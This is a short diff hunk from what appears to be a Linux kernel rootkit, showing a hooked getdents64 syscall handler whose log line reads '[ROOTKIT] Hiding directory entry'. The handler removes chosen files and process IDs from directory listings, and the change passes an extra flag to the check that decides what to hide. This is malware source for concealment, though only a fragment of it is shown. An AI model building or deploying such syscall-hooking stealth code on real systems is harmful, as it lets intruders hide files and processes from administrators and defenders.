@@ -93,7 +93,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         ui16_reclen = p_dirent_it->d_reclen;
 
         // Check if the current directory entry has to be hidden
-        IF_U (is_filename_or_pid_hidden(p_dirent_it->d_name, b_is_proc_root)) {
+        IF_U (is_filename_or_pid_hidden(p_dirent_it->d_name, b_is_proc_root, true)) {
             pr_info("[ROOTKIT]     * Hiding directory entry\n");
 
             IF_L ((char *)p_dirent_it + ui16_reclen < (char *)p_dirent_k + i64_ret) {
